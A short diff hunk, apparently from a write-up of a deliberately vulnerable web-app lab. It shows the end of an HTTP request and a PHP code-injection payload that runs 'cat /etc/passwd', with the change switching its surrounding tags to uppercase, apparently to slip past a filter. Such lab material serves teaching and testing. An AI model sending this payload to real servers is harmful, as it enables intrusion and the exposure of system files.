@@ -155,7 +155,7 @@ Content-Length: 70
 Cookie: security_level=0; PHPSESSID=e27e4148fbb0b82028e1cd6e159f4e7a
 Connection: close
 
-<b><?php $r; exec('cat /etc/passwd', $r); echo implode($r, "\n"); die; ?></b>
+<B><?php $r; exec('cat /etc/passwd', $r); echo implode($r, "\n"); die; ?></B>
 ```
 
 
